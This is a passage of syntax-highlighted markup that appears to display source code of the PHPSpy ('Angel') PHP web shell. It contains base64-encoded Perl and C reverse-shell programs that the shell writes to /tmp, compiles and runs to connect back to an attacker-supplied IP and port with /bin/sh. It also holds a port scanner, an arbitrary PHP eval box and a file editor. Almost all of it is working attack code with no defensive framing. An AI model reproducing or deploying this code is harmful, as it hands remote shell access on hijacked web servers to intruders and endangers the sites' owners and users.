#66cccc;\">'c'<\/span>=&gt;<span style=\"color: #66cccc;\">'c'<\/span>);\n\n<span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">back_connect<\/span>=<span style=\"color: #66cccc;\">\"IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJ<\/span><span style=\"color: #66cccc; text-decoration: underline;\">HN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiO2Vj\"<\/span><span style=\"text-decoration: underline;\">.<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #66cccc;\">\"aG8gImBpZGAiOy9iaW4vc2gnOw0KJDA9JGNtZDsNCiR0YXJnZXQ9JEFSR1ZbMF07DQokcG9<\/span><span style=\"color: #66cccc; text-decoration: underline;\">ydD0kQVJHVlsxXTsNCiRpYWRkcj1pbmV0X2F0b24oJHR\"<\/span><span style=\"text-decoration: underline;\">.<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #66cccc;\">\"hcmdldCkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRwb3<\/span><span style=\"color: #66cccc; text-decoration: underline;\">J0LCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKT\"<\/span><span style=\"text-decoration: underline;\">.<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #66cccc;\">\"sNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JT<\/span><span style=\"color: #66cccc; text-decoration: underline;\">kVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoI\"<\/span><span style=\"text-decoration: underline;\">.<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #66cccc;\">\"kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9y<\/span><span style=\"color: #66cccc; text-decoration: underline;\">OiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQi\"<\/span><span style=\"text-decoration: underline;\">.<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #66cccc;\">\"KTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQ<\/span><span style=\"color: #66cccc; text-decoration: underline;\">iKTsNCnN5c3RlbSgkc3lzdGVtKTsNCmNsb3NlKFNUREl\"<\/span><span style=\"text-decoration: underline;\">.<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #66cccc;\">\"OKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw==\"<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">back_connect_c<\/span>=<span style=\"color: #66cccc;\">\"I2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3lzL3NvY2tldC5oPg0<\/span><span style=\"color: #66cccc; text-decoration: underline;\">KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4NCmludC\"<\/span><span style=\"text-decoration: underline;\">.<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #66cccc;\">\"BtYWluKGludCBhcmdjLCBjaGFyICphcmd2W10pDQp7DQogaW50IGZkOw0KIHN0cnVjdCBzb<\/span><span style=\"color: #66cccc; text-decoration: underline;\">2NrYWRkcl9pbiBzaW47DQogY2hhciBybXNbMjFdPSJyb\"<\/span><span style=\"text-decoration: underline;\">.<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #66cccc;\">\"SAtZiAiOyANCiBkYWVtb24oMSwwKTsNCiBzaW4uc2luX2ZhbWlseSA9IEFGX0lORVQ7DQog<\/span><span style=\"color: #66cccc; text-decoration: underline;\">c2luLnNpbl9wb3J0ID0gaHRvbnMoYXRvaShhcmd2WzJd\"<\/span><span style=\"text-decoration: underline;\">.<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #66cccc;\">\"KSk7DQogc2luLnNpbl9hZGRyLnNfYWRkciA9IGluZXRfYWRkcihhcmd2WzFdKTsgDQogYnp<\/span><span style=\"color: #66cccc; text-decoration: underline;\">lcm8oYXJndlsxXSxzdHJsZW4oYXJndlsxXSkrMStzdHJ\"<\/span><span style=\"text-decoration: underline;\">.<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #66cccc;\">\"sZW4oYXJndlsyXSkpOyANCiBmZCA9IHNvY2tldChBRl9JTkVULCBTT0NLX1NUUkVBTSwgSV<\/span><span style=\"color: #66cccc; text-decoration: underline;\">BQUk9UT19UQ1ApIDsgDQogaWYgKChjb25uZWN0KGZkLC\"<\/span><span style=\"text-decoration: underline;\">.<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #66cccc;\">\"Aoc3RydWN0IHNvY2thZGRyICopICZzaW4sIHNpemVvZihzdHJ1Y3Qgc29ja2FkZHIpKSk8M<\/span><span style=\"color: #66cccc; text-decoration: underline;\">Ckgew0KICAgcGVycm9yKCJbLV0gY29ubmVjdCgpIik7D\"<\/span><span style=\"text-decoration: underline;\">.<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #66cccc;\">\"QogICBleGl0KDApOw0KIH0NCiBzdHJjYXQocm1zLCBhcmd2WzBdKTsNCiBzeXN0ZW0ocm1z<\/span><span style=\"color: #66cccc; text-decoration: underline;\">KTsgIA0KIGR1cDIoZmQsIDApOw0KIGR1cDIoZmQsIDEp\"<\/span><span style=\"text-decoration: underline;\">.<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #66cccc;\">\"Ow0KIGR1cDIoZmQsIDIpOw0KIGV4ZWNsKCIvYmluL3NoIiwic2ggLWkiLCBOVUxMKTsNCiB<\/span><span style=\"color: #66cccc; text-decoration: underline;\">jbG9zZShmZCk7IA0KfQ==\"<\/span><span style=\"text-decoration: underline;\">;<\/span>\n\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span> ($<span style=\"color: #ffcc66;\">start<\/span> &amp;&amp; $<span style=\"color: #ffcc66;\">yourip<\/span> &amp;&amp; $<span style=\"color: #ffcc66;\">yourport<\/span> &amp;&amp; $<span style=\"color: #ffcc66;\">use<\/span>){\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span> ($<span style=\"color: #ffcc66;\">use<\/span> == <span style=\"color: #66cccc;\">'perl'<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">cf(<\/span><span style=\"color: #66cccc;\">'\/tmp\/angel_bc'<\/span>,$<span style=\"color: #ffcc66;\">back_connect<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">res<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">execute(which(<\/span><span style=\"color: #66cccc;\">'perl'<\/span>).<span style=\"color: #66cccc;\">\" \/tmp\/angel_bc $yourip $yourport &amp;\"<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   } <span style=\"color: #99cc99;\">else<\/span> {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">cf(<\/span><span style=\"color: #66cccc;\">'\/tmp\/angel_bc.c'<\/span>,$<span style=\"color: #ffcc66;\">back_connect_c<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">res<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">execute(<\/span><span style=\"color: #66cccc;\">'gcc -o \/tmp\/angel_bc \/tmp\/angel_bc.c'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   @<span style=\"color: #cccccc; background-color: #2d2d2d;\">unlink(<\/span><span style=\"color: #66cccc;\">'\/tmp\/angel_bc.c'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">res<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">execute(<\/span><span style=\"color: #66cccc;\">\"\/tmp\/angel_bc $yourip $yourport &amp;\"<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">m(<\/span><span style=\"color: #66cccc;\">\"Now script try connect to $yourip port $yourport ...\"<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   }\n\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">formhead(array(<\/span><span style=\"color: #66cccc;\">'title'<\/span>=&gt;<span style=\"color: #66cccc;\">'Back Connect'<\/span>));\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">makehide(<\/span><span style=\"color: #66cccc;\">'action'<\/span>,<span style=\"color: #66cccc;\">'backconnect'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;p&gt;'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'Your IP:'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">makeinput(array(<\/span><span style=\"color: #66cccc;\">'name'<\/span>=&gt;<span style=\"color: #66cccc;\">'yourip'<\/span>,<span style=\"color: #66cccc;\">'size'<\/span>=&gt;<span style=\"color: #cccccc; background-color: #2d2d2d;\">20<\/span>,<span style=\"color: #66cccc;\">'value'<\/span>=&gt;$<span style=\"color: #ffcc66;\">yourip<\/span>));\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'Your Port:'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">makeinput(array(<\/span><span style=\"color: #66cccc;\">'name'<\/span>=&gt;<span style=\"color: #66cccc;\">'yourport'<\/span>,<span style=\"color: #66cccc;\">'size'<\/span>=&gt;<span style=\"color: #cccccc; background-color: #2d2d2d;\">15<\/span>,<span style=\"color: #66cccc;\">'value'<\/span>=&gt;$<span style=\"color: #ffcc66;\">yourport<\/span>));\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'Use:'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">makeselect(array(<\/span><span style=\"color: #66cccc;\">'name'<\/span>=&gt;<span style=\"color: #66cccc;\">'use'<\/span>,<span style=\"color: #66cccc;\">'option'<\/span>=&gt;$<span style=\"color: #ffcc66;\">usedb<\/span>,<span style=\"color: #66cccc;\">'selected'<\/span>=&gt;$<span style=\"color: #ffcc66;\">use<\/span>));\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">makeinput(array(<\/span><span style=\"color: #66cccc;\">'name'<\/span>=&gt;<span style=\"color: #66cccc;\">'start'<\/span>,<span style=\"color: #66cccc;\">'value'<\/span>=&gt;<span style=\"color: #66cccc;\">'Start'<\/span>,<span style=\"color: #66cccc;\">'type'<\/span>=&gt;<span style=\"color: #66cccc;\">'submit'<\/span>,<span style=\"color: #66cccc;\">'class'<\/span>=&gt;<span style=\"color: #66cccc;\">'<\/span><span style=\"color: #66cccc; text-decoration: underline;\">bt'<\/span><span style=\"text-decoration: underline;\">));<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;\/p&gt;'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">formfoot(<\/span>);\n}<span style=\"color: #999999; font-style: italic;\">\/\/<\/span><span style=\"color: #999999; font-style: italic;\">end<\/span>\n\n<span style=\"color: #99cc99;\">elseif<\/span> ($<span style=\"color: #ffcc66;\">action<\/span> == <span style=\"color: #66cccc;\">'portscan'<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   !$<span style=\"color: #ffcc66;\">scanip<\/span> &amp;&amp; $<span style=\"color: #ffcc66;\">scanip<\/span> = <span style=\"color: #66cccc;\">'127.0.0.1'<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   !$<span style=\"color: #ffcc66;\">scanport<\/span> &amp;&amp; $<span style=\"color: #ffcc66;\">scanport<\/span> = <span style=\"color: #66cccc;\">'21,25,80,110,135,139,445,1433,3306,3389,5631,4395<\/span><span style=\"color: #66cccc; text-decoration: underline;\">8'<\/span><span style=\"text-decoration: underline;\">;<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">formhead(array(<\/span><span style=\"color: #66cccc;\">'title'<\/span>=&gt;<span style=\"color: #66cccc;\">'Port Scan'<\/span>));\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">makehide(<\/span><span style=\"color: #66cccc;\">'action'<\/span>,<span style=\"color: #66cccc;\">'portscan'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;p&gt;'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'IP:'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">makeinput(array(<\/span><span style=\"color: #66cccc;\">'name'<\/span>=&gt;<span style=\"color: #66cccc;\">'scanip'<\/span>,<span style=\"color: #66cccc;\">'size'<\/span>=&gt;<span style=\"color: #cccccc; background-color: #2d2d2d;\">20<\/span>,<span style=\"color: #66cccc;\">'value'<\/span>=&gt;$<span style=\"color: #ffcc66;\">scanip<\/span>));\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'Port:'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">makeinput(array(<\/span><span style=\"color: #66cccc;\">'name'<\/span>=&gt;<span style=\"color: #66cccc;\">'scanport'<\/span>,<span style=\"color: #66cccc;\">'size'<\/span>=&gt;<span style=\"color: #cccccc; background-color: #2d2d2d;\">80<\/span>,<span style=\"color: #66cccc;\">'value'<\/span>=&gt;$<span style=\"color: #ffcc66;\">scanport<\/span>));\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">makeinput(array(<\/span><span style=\"color: #66cccc;\">'name'<\/span>=&gt;<span style=\"color: #66cccc;\">'startscan'<\/span>,<span style=\"color: #66cccc;\">'value'<\/span>=&gt;<span style=\"color: #66cccc;\">'Scan'<\/span>,<span style=\"color: #66cccc;\">'type'<\/span>=&gt;<span style=\"color: #66cccc;\">'submit'<\/span>,<span style=\"color: #66cccc;\">'class'<\/span><span style=\"text-decoration: underline;\">=&gt;<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'bt'<\/span><span style=\"text-decoration: underline;\">));<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;\/p&gt;'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">formfoot(<\/span>);\n\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span> ($<span style=\"color: #ffcc66;\">startscan<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;h2&gt;Result &amp;raquo;&lt;\/h2&gt;'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;ul class=\"info\"&gt;'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">foreach<\/span>(<span style=\"color: #cccccc; background-color: #2d2d2d;\">explode(<\/span><span style=\"color: #66cccc;\">','<\/span>, $<span style=\"color: #ffcc66;\">scanport<\/span>) <span style=\"color: #99cc99;\">as<\/span> $<span style=\"color: #ffcc66;\">port<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">fp<\/span> = @<span style=\"color: #cccccc; background-color: #2d2d2d;\">fsockopen(<\/span>$<span style=\"color: #ffcc66;\">scanip<\/span>, $<span style=\"color: #ffcc66;\">port<\/span>, &amp;$<span style=\"color: #ffcc66;\">errno<\/span>, &amp;$<span style=\"color: #ffcc66;\">errstr<\/span>, <span style=\"color: #cccccc; background-color: #2d2d2d;\">1<\/span>);<span style=\"color: #f2777a; background-color: #515151;\"> <\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span> (!$<span style=\"color: #ffcc66;\">fp<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;li&gt;'<\/span>.$<span style=\"color: #ffcc66;\">scanip<\/span>.<span style=\"color: #66cccc;\">':'<\/span>.$<span style=\"color: #ffcc66;\">port<\/span>.<span style=\"color: #66cccc;\">' ------------------------ &lt;span styl<\/span><span style=\"color: #66cccc; text-decoration: underline;\">e=\"font-weight:bold;color:#f00;\"&gt;Close&lt;\/span&gt;&lt;\/li&gt;'<\/span><span style=\"text-decoration: underline;\">);<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>  } <span style=\"color: #99cc99;\">else<\/span> {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;li&gt;'<\/span>.$<span style=\"color: #ffcc66;\">scanip<\/span>.<span style=\"color: #66cccc;\">':'<\/span>.$<span style=\"color: #ffcc66;\">port<\/span>.<span style=\"color: #66cccc;\">' ------------------------ &lt;span styl<\/span><span style=\"color: #66cccc; text-decoration: underline;\">e=\"font-weight:bold;color:#080;\"&gt;Open&lt;\/span&gt;&lt;\/li&gt;'<\/span><span style=\"text-decoration: underline;\">);<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   @<span style=\"color: #cccccc; background-color: #2d2d2d;\">fclose(<\/span>$<span style=\"color: #ffcc66;\">fp<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>  }<span style=\"color: #f2777a; background-color: #515151;\"> <\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;\/ul&gt;'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   }\n}\n\n<span style=\"color: #99cc99;\">elseif<\/span> ($<span style=\"color: #ffcc66;\">action<\/span> == <span style=\"color: #66cccc;\">'eval'<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">phpcode<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">trim(<\/span>$<span style=\"color: #ffcc66;\">phpcode<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span>($<span style=\"color: #ffcc66;\">phpcode<\/span>){\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span> (!<span style=\"color: #cccccc; background-color: #2d2d2d;\">preg_match(<\/span><span style=\"color: #66cccc;\">'#&lt;\\?#si'<\/span>, $<span style=\"color: #ffcc66;\">phpcode<\/span>)) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">phpcode<\/span> = <span style=\"color: #66cccc;\">\"&lt;?php\\n\\n{$phpcode}\\n\\n?&gt;\"<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">eval(<\/span><span style=\"color: #66cccc;\">\"?\"<\/span>.<span style=\"color: #66cccc;\">\"&gt;$phpcode&lt;?\"<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">formhead(array(<\/span><span style=\"color: #66cccc;\">'title'<\/span>=<span style=\"color: #6699cc;\">&gt;<\/span><span style=\"color: #66cccc;\">'Eval PHP Code'<\/span>));\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">makehide(<\/span><span style=\"color: #66cccc;\">'action'<\/span>,<span style=\"color: #66cccc;\">'eval'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">maketext(array(<\/span><span style=\"color: #66cccc;\">'title'<\/span>=&gt;<span style=\"color: #66cccc;\">'PHP Code'<\/span>,<span style=\"color: #66cccc;\">'name'<\/span>=&gt;<span style=\"color: #66cccc;\">'phpcode'<\/span>, <span style=\"color: #66cccc;\">'value'<\/span>=&gt;$<span style=\"color: #ffcc66;\">phpcode<\/span>));\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;p&gt;&lt;a href=\"http:\/\/w'<\/span>.<span style=\"color: #66cccc;\">'ww.4ng'<\/span>.<span style=\"color: #66cccc;\">'el.net\/php'<\/span>.<span style=\"color: #66cccc;\">'spy\/pl'<\/span>.<span style=\"color: #66cccc;\">'ugin\/\" target=\"_bla<\/span><span style=\"color: #66cccc; text-decoration: underline;\">nk\"&gt;Get plugins&lt;\/a&gt;&lt;\/p&gt;'<\/span><span style=\"text-decoration: underline;\">);<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">formfooter(<\/span>);\n}<span style=\"color: #999999; font-style: italic;\">\/\/<\/span><span style=\"color: #999999; font-style: italic;\">end eval<\/span>\n\n<span style=\"color: #99cc99;\">elseif<\/span> ($<span style=\"color: #ffcc66;\">action<\/span> == <span style=\"color: #66cccc;\">'editfile'<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span>(<span style=\"color: #cccccc; background-color: #2d2d2d;\">file_exists(<\/span>$<span style=\"color: #ffcc66;\">opfile<\/span>)) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">fp<\/span>=@<span style=\"color: #cccccc; background-color: #2d2d2d;\">fopen(<\/span>$<span style=\"color: #ffcc66;\">opfile<\/span>,<span style=\"color: #66cccc;\">'r'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">contents<\/span>=@<span style=\"color: #cccccc; background-color: #2d2d2d;\">fread(<\/span>$<span style=\"color: #ffcc66;\">fp<\/span>, <span style=\"color: #cccccc; background-color: #2d2d2d;\">filesize(<\/span>$<span style=\"color: #ffcc66;\">opfile<\/span>));\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   @<span style=\"color: #cccccc; background-color: #2d2d2d;\">fclose(<\/span>$<span style=\"color: #ffcc66;\">fp<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">contents<\/span>=<span style=\"color: #cccccc; background-color: #2d2d2d;\">htmlspecialchars(<\/span>$<span style=\"color: #ffcc66;\">contents<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">formhead(array(<\/span><span style=\"color: #66cccc;\">'title'<\/span>=&gt;<span style=\"color: #66cccc;\">'Create \/ Edit File'<\/span>));\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">makehide(<\/span><span style=\"color: #66cccc;\">'action'<\/span>,<span style=\"color: #66cccc;\">'file'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">makehide(<\/span><span style=\"color: #66cccc;\">'dir'<\/span>,$<span style=\"color: #ffcc66;\">nowpath<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">makeinput(array(<\/span><span style=\"color: #66cccc;\">'title'<\/span>=&gt;<span style=\"color: #66cccc;\">'Current File (import new file name and new file)'<\/span>,<span style=\"color: #66cccc; text-decoration: underline;\">'name'<\/span><span style=\"text-decoration: underline;\">=&gt;<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'editfilename'<\/span><span style=\"text-decoration: underline;\">,<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'value'<\/span><span style=\"text-decoration: underline;\">=&gt;$<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">opfile<\/span><span style=\"text-decoration: underline;\">,<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'newline'<\/span><span style=\"text-decoration: underline;\">=&gt;<\/span><span style=\"color: #cccccc; background-color: #2d2d2d; text-decoration: underline;\">1<\/span><span style=\"text-decoration: underline;\">));<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">maketext(array(<\/span><span style=\"color: #66cccc;\">'title'<\/span>=&gt;<span style=\"color: #66cccc;\">'File Content'<\/span>,<span style=\"color: #66cccc;\">'name'<\/span>=&gt;<span style=\"color: #66cccc;\">'filecontent'<\/span>,<span style=\"color: #66cccc;\">'value'<\/span>=&gt;$<span style=\"color: #ffcc66;\">conte<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">nts<\/span><span style=\"text-decoration: underline;\">));<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">formfooter(<\/span>);\n\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">goback(<\/span>);\n\n}<span style=\"color: #999999; font-style: italic;\">\/\/<\/span><span style=\"color: #999999; font-style: italic;\">end editfile<\/span>\n\n<span style=\"color: #99cc99;\">elseif<\/span> ($<span style=\"color: #ffcc66;\">action<\/span> == <span style=\"color: 